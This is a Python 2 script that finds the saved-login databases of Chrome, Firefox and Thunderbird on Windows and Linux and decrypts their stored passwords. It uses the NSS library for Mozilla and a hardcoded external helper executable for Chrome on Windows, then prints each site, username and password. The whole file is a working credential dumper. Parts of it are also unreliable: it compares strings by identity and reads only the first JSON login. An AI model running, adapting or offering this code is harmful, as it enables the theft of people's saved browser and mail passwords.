#!/usr/bin/python

####
### Finds Google Chrome / Opera / Firefox login database
##  and decrypt them.
#
##  Generates signatures.
###
####

from ctypes import *
import getpass, platform, sqlite3, os, json, subprocess, base64, glob

### Code from ffpwdcracker.py

#Password structures
class SECItem(Structure):
	_fields_ = [('type',c_uint),('data',c_void_p),('len',c_uint)]

class secuPWData(Structure):
	_fields_ = [('source',c_ubyte),('data',c_char_p)]

(SECWouldBlock,SECFailure,SECSuccess)=(-2,-1,0)
(PW_NONE,PW_FROMFILE,PW_PLAINTEXT,PW_EXTERNAL)=(0,1,2,3)

### End code from ffpwdcracker.py

### Constants and globals

GCHROME_LOGIN_FILE = "Login Data"
MOZ_LOGIN_FILE_DB = "signons.sqlite"
MOZ_LOGIN_FILE_JSON = "logins.json"

username = getpass.getuser()
opsys = platform.system()
libnss = "libnss3.so" if opsys == "Linux" else "nss3.dll"

GCHROME_PROFILE_WIN = "C:\Users\\" + username + "\AppData\Local\Google\Chrome\User Data"
FF_PROFILE_WIN = "C:\Users\\" + username + "\AppData\Roaming\Mozilla\Firefox"
TH_PROFILE_WIN = "C:\Users\\" + username + "\AppData\Roaming\Thunderbird"

GCHROME_PROFILE_LINUX = "/home/" + username + "/.config/google-chrome"
FF_PROFILE_LINUX = "/home/" + username + "/.mozilla/firefox"
TH_PROFILE_LINUX = "/home/" + username + "/.thunderbird"

WIN_DECRYPTER = "C:\\Users\\John\\Documents\\Visual Studio 2012\\Projects\\ConsoleApplication3\\Debug\\ConsoleApplication3.exe"

#detect os and set profile folders
if opsys == "Linux":
	chromeProfile = GCHROME_PROFILE_LINUX
	ffProfile = FF_PROFILE_LINUX
	thProfile = TH_PROFILE_LINUX
elif opsys == "Windows":
	chromeProfile = GCHROME_PROFILE_WIN
	ffProfile = FF_PROFILE_WIN
	thProfile = TH_PROFILE_WIN

### End Constants and globals

### Def

def getPasswords(loginFile):
	""" Select password from relative SQLite database """

	if not os.path.isfile(loginFile):
		return None

	conn = sqlite3.connect(loginFile)

	if loginFile is GCHROME_LOGIN_FILE:
		#chrome on windows, run Windows C application
		if opsys == "Windows":
			print "Attempting to decrypt Windows Chrome logins"

			query = "SELECT origin_url, username_value, hex(password_value) FROM logins"

			for row in conn.execute(query):
				pwd = row[2]
				#execute windows decrypt helper with password as parameter
				retval = subprocess.check_output([WIN_DECRYPTER, pwd])
				print retval

		#chrome on linux, clear text password or encrypted with key chain, simply return the value we found
		elif opsys == "Linux":
			query = "SELECT origin_url, username_value, quote(password_value) FROM logins"

			for row in conn.execute(query):
				data = [row[0],row[1],row[2]]
				print data

	elif loginFile is MOZ_LOGIN_FILE_DB:
		query = "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins"

		for row in conn.execute(query):
			#firefox/thunderbird on linux/windows, use NSS library to decrypt
			credentials = decryptMozilla(row[1],row[2])
			data = [row[0], credentials]
			print data

	conn.close()
		
def decryptMozilla(username, password):
	""" Decrypt mozilla login, based on ffpwdcracker.py """
	# code from ffpwdcracker.py
	nss = CDLL(libnss)
	
	if nss.NSS_Init(os.getcwd()) != 0:
		print "Error initializing NSS"
		return None

	#prepare data structures
	pwdata = secuPWData()
	pwdata.source = PW_NONE
	pwdata.data=0

	uname = SECItem()
	passwd = SECItem()
	dectext = SECItem()

	uname.data = cast(c_char_p(base64.b64decode(username)),c_void_p)
	uname.len = len(base64.b64decode(username))

	passwd.data = cast(c_char_p(base64.b64decode(password)),c_void_p)
	passwd.len = len(base64.b64decode(password))

	#decrypt
	if nss.PK11SDR_Decrypt(byref(uname),byref(dectext),byref(pwdata))==-1:
		print nss.PORT_GetError()
		print "Error decrypting"
		return None

	decUsername = string_at(dectext.data,dectext.len)

	if nss.PK11SDR_Decrypt(byref(passwd),byref(dectext),byref(pwdata))==-1:
		print nss.PORT_GetError()
		print "Error decrypting"
		return None

	decPassword = string_at(dectext.data,dectext.len)
	
	decitems = [decUsername, decPassword]
	nss.NSS_Shutdown()
	return decitems
	
def readLoginsJSON(loginFileJSON):
	""" Read the JSON of Firefox login data """

	if not os.path.isfile(loginFileJSON):
		return None

	data = json.loads(open(loginFileJSON).read())

	credentials = decryptMozilla(data['logins'][0]['encryptedUsername'],data['logins'][0]['encryptedPassword'])
	data = [data['logins'][0]['hostname'], credentials]
	print data

def readMozillaLogins(sw, profileDir):
	""" Read and parse the login file of thunderbird or firefox """

	print "===> Attempting to read " + sw + " login file"

	#get first default profile directory
	os.chdir(profileDir)

	#open and read profiles.ini
	profiles = open("profiles.ini", "r")

	for line in profiles:
		# get profile directory
		if line.startswith("Path="): 
			p = line.split("=")[1].strip("\n")
			print "Found profile directory " + p
			os.chdir(p)

			# look for signons.sqlite
			getPasswords(MOZ_LOGIN_FILE_DB)

			# look for logins.json
			readLoginsJSON(MOZ_LOGIN_FILE_JSON)

			#go up one directory
			os.chdir(os.path.dirname(os.getcwd()))

def readChromeLogins():
	""" Read and parse the logi n file of chrome """

	print "===> Attempting to read chrome login file"
	os.chdir(chromeProfile)

	#look in default profile
	if os.path.isdir("Default"):
		os.chdir("Default")
		print "Found profile directory Default"
		getPasswords(GCHROME_LOGIN_FILE)

		#up one directory
		os.chdir(os.path.dirname(os.getcwd()))

	#look for other profiles (Profile 1, Profile 2, Profile 3, ...)
	print os.getcwd()

	profiles = glob.glob("Profile *")

	for profile in profiles:
		os.chdir(profile)
		print "Found profile directory " + profile
		getPasswords(GCHROME_LOGIN_FILE)

		#up one directory
		os.chdir(os.path.dirname(os.getcwd()))

### End Def

### Code

#google-chrome
readChromeLogins()

#firefox & thunderbird
readMozillaLogins("firefox", ffProfile)
readMozillaLogins("thunderbird", thProfile)

### End Code
